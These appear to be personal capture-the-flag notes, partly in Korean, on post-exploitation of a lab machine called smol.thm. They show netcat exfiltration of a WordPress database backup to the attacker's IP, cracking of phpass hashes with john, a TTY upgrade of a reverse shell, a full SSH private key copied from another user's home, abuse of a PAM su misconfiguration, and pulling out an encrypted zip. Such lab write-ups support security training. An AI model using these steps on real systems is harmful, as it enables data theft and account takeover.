fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
ssm-user:x:1004:1006::/home/ssm-user:/bin/sh
ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash

# root

# think:x:1000:1000:,,,:/home/think:/bin/bash

$ ls /opt/
wp_backup.sql

cat /opt/wp_backup.sql
cat /opt/wp_backup.sql | grep think

move to local this file

# me

nc -lvnp 1234 > received.txt

# target

nc 10.8.136.212 1234 < /opt/wp_backup.sql

# home user list

diego
gege
ssm-user
think
ubuntu
xavi

cat received.txt | grep think
cat received.txt | grep diego
cat received.txt | grep gege
cat received.txt | grep ssm-user
cat received.txt | grep ubuntu
cat received.txt | grep xavi

think','$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/','think','josemlwdf@smol.thm','http://smol.thm','2023-08-16 15:01:02','',0,'Jose Mario Llado Marti'),(4,'gege','$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1','gege','gege@smol.thm','http://smol.thm','2023-08-17 20:18:50','',0,'gege'),(5,'diego','$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1','diego','diego@smol.thm','http://smol.thm','2023-08-17 20:19:15','',0,'diego'),(6,'xavi','$P$BvcalhsCfVILp2SgttADny40mqJZCN/','xavi','xavi@smol.thm','http://smol.thm','2023-08-17 20:20:01','',0,'xavi');

# cracking -> .txt 로 하니까 인코딩 문제 발생 -> .hash 로 반드시 저장하기!

echo '$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/' > think.hash
echo '$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1' > gege.hash
echo '$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1' > diego.hash
echo '$P$BvcalhsCfVILp2SgttADny40mqJZCN/' > xavi.hash

john --wordlist=/usr/share/wordlists/rockyou.txt think.hash

# DONE (2025-07-26 07:21) 0g/s -> 0개 크랙됨

─(root㉿docker-desktop)-[/]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt think.hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:10 1.33% (ETA: 07:21:56) 0g/s 22403p/s 22403c/s 22403C/s bossdog..betty77
0g 0:00:00:11 1.46% (ETA: 07:21:55) 0g/s 22411p/s 22411c/s 22411C/s cumcum..clown13
0g 0:00:11:46 DONE (2025-07-26 07:21) 0g/s 20302p/s 20302c/s 20302C/s !!!@@@!!!..\*7¡Vamos!
Session completed.

# john --wordlist=/usr/share/wordlists/rockyou.txt think.hash

# 기본적으로 john 은 username:hash 로 인식하므로 형태 지키기

cat <<'EOF' > users.hash
think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
EOF

# john --wordlist=/usr/share/wordlists/rockyou.txt users.hash

sandiegocalifornia (diego)

# su diego -> 무반응 이슈

# IP: 10.10.97.230

### ✅ 원인: `su`는 **TTY (가상 터미널)** 가 필요합니다.

- `su`는 **비밀번호 입력을 위해 /dev/tty 또는 stdin이 TTY인지 검사**합니다.
- 리버스 쉘은 기본적으로 TTY가 **없기 때문에**, 비밀번호 입력 처리를 못 해서 **그냥 멈춰있는 것처럼 보입니다.**

### ✔️ 1. Python을 통한 TTY 업그레이드

리버스 쉘에서 아래 명령어를 실행:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### ✔️ 2. `stty` 오류 방지 (선택)

```bash
export TERM=xterm
```

---

### ✔️ 3. 백그라운드로 전환 후 `fg`로 복원 (netcat일 경우에만)

1. 백그라운드 전환:
   Ctrl+Z

2. 터미널 로 설정:

```bash
stty raw -echo
```

3. 복귀:

```bash
fg
```

4. 다시 Enter 키 누르기

이제 `su diego` 하면 비밀번호 입력 프롬프트가 잘 뜨고 정상 작동할 수 있습니다.

---

## 🔁 대안: SSH로 직접 접속 (더 안정적)

이미 `sandiegocalifornia` 비밀번호를 알아냈고, 사용자가 존재한다면 아래처럼 직접 SSH 로그인하는 게 더 좋습니다:

```bash
ssh diego@10.10.97.230
# 비밀번호: sandiegocalifornia
```

## SSH가 안 되고 리버스 쉘만 있다면 위에서 소개한 TTY 업그레이드를 반드시 적용해야 합니다.

www-data@ip-10-10-97-230:/var/www/wordpress/wp-admin$ su diego
Password:
diego@ip-10-10-97-230:/var/www/wordpress/wp-admin$ id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
diego@ip-10-10-97-230:/var/www/wordpress/wp-admin$

diego@ip-10-10-97-230:/home$ cd diego/
diego@ip-10-10-97-230:~$ ls
user.txt
diego@ip-10-10-97-230:~$ cat user.txt
45edaec653ff9ee06236b7ce72b86963
diego@ip-10-10-97-230:~$

diego@ip-10-10-97-230:~$ ls ../gege
wordpress.old.zip
diego@ip-10-10-97-230:~$ ls ../ssm-user/
diego@ip-10-10-97-230:~$ ls -al ../ssm-user/
total 20
drwxr-xr-x 2 ssm-user ssm-user 4096 Jul 20 11:11 .
drwxr-xr-x 8 root root 4096 Jul 26 05:28 ..
-rw-r--r-- 1 ssm-user ssm-user 220 Jan 12 2024 .bash_logout
-rw-r--r-- 1 ssm-user ssm-user 3771 Jan 12 2024 .bashrc
-rw-r--r-- 1 ssm-user ssm-user 807 Jan 12 2024 .profile
diego@ip-10-10-97-230:~$ ls -al ../think/
total 32
drwxr-x--- 5 think internal 4096 Jan 12 2024 .
drwxr-xr-x 8 root root 4096 Jul 26 05:28 ..
lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think 220 Jun 2 2023 .bash_logout
-rw-r--r-- 1 think think 3771 Jun 2 2023 .bashrc
drwx------ 2 think think 4096 Jan 12 2024 .cache
drwx------ 3 think think 4096 Aug 18 2023 .gnupg
-rw-r--r-- 1 think think 807 Jun 2 2023 .profile
drwxr-xr-x 2 think think 4096 Jun 21 2023 .ssh
lrwxrwxrwx 1 root root 9 Aug 18 2023 .viminfo -> /dev/null
diego@ip-10-10-97-230:~$ cd ../think
diego@ip-10-10-97-230:/home/think$ ls
diego@ip-10-10-97-230:/home/think$ cd .ssh
diego@ip-10-10-97-230:/home/think/.ssh$ ls
authorized_keys id_rsa id_rsa.pub
diego@ip-10-10-97-230:/home/think/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
diego@ip-10-10-97-230:/home/think/.ssh$

# IP: 10.10.97.230 -> SSH

┌──(root㉿docker-desktop)-[/]
└─# ssh -i id_rsa.pem think@10.10.97.230
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@ WARNING: UNPROTECTED PRIVATE KEY FILE! @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa.pem' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa.pem": bad permissions
think@10.10.97.230: Permission denied (publickey).

# ssh -i id_rsa.pem think@10.10.97.230 -> SSH 접속 성공

┌──(root㉿docker-desktop)-[/]
└─# chmod 700 id_rsa.pem

┌──(root㉿docker-desktop)-[/]
└─# ssh -i id_rsa.pem think@10.10.97.230
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

- Documentation: https://help.ubuntu.com
- Management: https://landscape.canonical.com
- Support: https://ubuntu.com/pro

System information as of Sat 26 Jul 2025 07:58:14 AM UTC

System load: 0.0 Processes: 144
Usage of /: 70.1% of 9.75GB Users logged in: 0
Memory usage: 19% IPv4 address for ens5: 10.10.97.230
Swap usage: 0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

37 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04

Your Hardware Enablement Stack (HWE) is supported until April 2025.

think@ip-10-10-97-230:~$

think@ip-10-10-97-230:~$ pwd
/home/think
think@ip-10-10-97-230:~$

# gege -> 그냥 전환이 되네? -> misconfiguration

cat /etc/pam.d/su

think@ip-10-10-97-230:/home/gege$ ls
wordpress.old.zip
think@ip-10-10-97-230:/home/gege$

```bash
think@ip-10-10-97-230:/home/gege$ cat /etc/pam.d/su
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
# Uncomment this to force users to be a member of group root
# before they can use `su'. You can also add "group=foo"
# to the end of this line if you want to use a group other
# than the default "root" (but this may have side effect of
# denying "root" user, unless she's a member of "foo" or explicitly
# permitted earlier by e.g. "sufficient pam_rootok.so").
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
# auth       required   pam_wheel.so

# Uncomment this if you want wheel members to be able to
# su without a password.
# auth       sufficient pam_wheel.so trust

# Uncomment this if you want members of a specific group to not
# be allowed to use su at all.
# auth       required   pam_wheel.so deny group=nosu

# Uncomment and edit /etc/security/time.conf if you need to set
# time restrainst on su usage.
# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
# as well as /etc/porttime)
# account    requisite  pam_time.so

# This module parses environment configuration file(s)
# and also allows you to use an extended config
# file /etc/security/pam_env.conf.
#
# parsing /etc/environment needs "readenv=1"
session       required   pam_env.so readenv=1
# locale variables are also kept into /etc/default/locale in etch
# reading this file *in addition to /etc/environment* does not hurt
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

# Defines the MAIL environment variable
# However, userdel also needs MAIL_DIR and MAIL_FILE variables
# in /etc/login.defs to make sure that removing a user
# also removes the user's mail spool file.
# See comments in /etc/login.defs
#
# "nopen" stands to avoid reporting new mail when su'ing to another user
session    optional   pam_mail.so nopen

# Sets up user limits according to /etc/security/limits.conf
# (Replaces the use of /etc/limits in old login)
session    required   pam_limits.so

# The standard Unix authentication modules, used with
# NIS (man nsswitch) as well as normal /etc/passwd and
# /etc/shadow entries.
@include common-auth
@include common-account
@include common-session


think@ip-10-10-97-230:/home/gege$
```

# unzip wordpress.old.zip -> 암호화 걸림 -> 다운로드 필요

wordpress.old wordpress.old.zip
gege@ip-10-10-97-230:~$ unzip wordpress.old.zip
Archive: wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password:

# python3 -m http.server 8080 -> in target

[wordpress.old.zip] wordpress.old/wp-config.php password: gege@ip-10-10-97-230:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

# attacker -> 공격자에서 요청 설치 -> 서버를 오픈했던 path 를 기반으로 설치할 파일 요청

wget http://www.smol.thm:8080/wordpress.old.zip
